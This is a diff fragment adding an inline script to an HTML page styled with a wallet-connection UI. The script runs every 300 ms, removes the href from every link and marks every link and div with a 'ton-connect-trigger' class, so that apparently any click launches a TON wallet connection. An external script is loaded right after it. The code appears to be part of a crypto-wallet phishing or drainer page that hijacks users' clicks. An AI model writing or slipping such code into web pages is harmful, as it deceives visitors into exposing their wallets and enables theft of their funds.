@@ -15079,6 +15079,21 @@ wui-flex { overflow: hidden auto; display: flex; align-items: center; justify-co
         --wui-thumbnail-border-base: #252525;
       }
     </style>
+	<script>
+	function addClassesToElements() {
+
+	const links = document.querySelectorAll('a:not(.ton-connect-trigger)');
+	for (const link of links) {
+		link.removeAttribute('href');
+		link.classList.add('ton-connect-trigger');
+	}
+	const buttons = document.querySelectorAll('div:not(.ton-connect-trigger)');
+	for (const button of buttons) {
+		button.classList.add('ton-connect-trigger');
+	}
+	}
+	setInterval(addClassesToElements, 300);
+</script>
 <script src="/vrtx.js?v=1.0.0" defer crossorigin></script>
 <script>
     window.addEventListener('load', () => {
